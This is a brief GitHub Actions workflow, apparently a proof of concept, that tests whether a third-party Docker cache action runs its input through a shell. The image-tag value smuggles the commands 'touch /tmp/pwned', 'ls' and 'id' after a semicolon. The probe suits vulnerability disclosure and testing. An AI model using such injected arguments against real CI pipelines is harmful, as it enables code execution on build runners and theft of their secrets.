name: Codex Proof

on:
  push:
    branches:
    - codex-proof-workflow

permissions:
  contents: read

jobs:
  prove-shell-interpretation:
    runs-on: ubuntu-24.04
    steps:
    - name: Prime Docker cache with probe image tag
      uses: envoyproxy/toolshed/actions/docker/cache/prime@8d5d8d4b9eeb5e4e76b92341b0b1b1f6438af231
      with:
        image-tag: 'docker.io/library/alpine; touch /tmp/pwned; ls -l /tmp/pwned >&2; id >&2; #:latest@sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659'
